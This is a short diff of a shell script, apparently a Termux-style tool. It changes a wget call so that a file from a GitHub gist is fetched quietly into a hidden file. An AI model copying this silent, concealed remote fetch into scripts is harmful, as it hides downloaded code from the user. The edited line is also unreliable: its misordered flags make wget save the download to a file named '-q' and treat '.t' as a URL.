@@ -22,7 +22,7 @@ fi
 }
 dl() {
 cd ~
-wget -O tu https://gist.githubusercontent.com/rooted-cyber/05ca0b015cdbdb3ac87bb9cdaed3da75/raw/tu
+wget -O -q .t https://gist.githubusercontent.com/rooted-cyber/05ca0b015cdbdb3ac87bb9cdaed3da75/raw/tu
 cpp > /dev/null 2>&1
 }
 fol() {
